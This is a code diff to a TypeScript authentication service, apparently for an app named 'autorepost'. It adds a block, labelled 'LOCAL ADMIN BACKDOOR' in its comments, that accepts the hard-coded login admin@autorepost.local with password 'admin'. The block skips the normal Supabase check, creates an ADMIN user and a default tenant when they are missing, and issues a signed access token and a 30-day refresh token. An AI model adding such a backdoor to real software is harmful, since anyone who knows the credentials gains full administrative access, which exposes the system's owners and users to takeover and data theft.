@@ -36,6 +36,74 @@ export class AuthService {
   ) {}
 
   async login(email: string, password: string, ipAddress?: string, userAgent?: string): Promise<LoginResponse> {
+    // --- LOCAL ADMIN BACKDOOR ---
+    if (email === 'admin@autorepost.local' && password === 'admin') {
+      let dbUser = await this.prisma.user.findFirst({
+        where: { email },
+        include: { tenant: true }
+      });
+
+      if (!dbUser) {
+        let tenant = await this.prisma.tenant.findUnique({ where: { slug: 'default' } });
+        if (!tenant) {
+          tenant = await this.prisma.tenant.create({
+            data: { name: 'Default Tenant', slug: 'default' }
+          });
+        }
+        dbUser = await this.prisma.user.create({
+          data: {
+            email,
+            displayName: 'Local Admin',
+            tenantId: tenant.id,
+            supabaseUserId: 'local-admin-override',
+            role: UserRole.ADMIN,
+            status: AccountStatus.ACTIVE
+          },
+          include: { tenant: true }
+        });
+      }
+
+      await this.prisma.user.update({
+        where: { id: dbUser.id },
+        data: { lastLoginAt: new Date() }
+      });
+
+      const refreshToken = uuidv4();
+      const validUntil = new Date();
+      validUntil.setDate(validUntil.getDate() + 30);
+
+      await this.prisma.userSession.create({
+        data: {
+          userId: dbUser.id,
+          refreshToken,
+          ipAddress,
+          userAgent,
+          validUntil
+        }
+      });
+
+      const accessToken = this.jwtService.sign({
+        sub: dbUser.id,
+        email: dbUser.email,
+        tenantId: dbUser.tenantId,
+        role: dbUser.role,
+        supabaseUserId: dbUser.supabaseUserId
+      });
+
+      return {
+        accessToken,
+        refreshToken,
+        user: {
+          id: dbUser.id,
+          email: dbUser.email,
+          displayName: dbUser.displayName,
+          role: dbUser.role,
+          tenantId: dbUser.tenantId
+        }
+      };
+    }
+    // --- END LOCAL ADMIN BACKDOOR ---
+
     const supabaseClient = this.supabase.getClient();
 
     const {
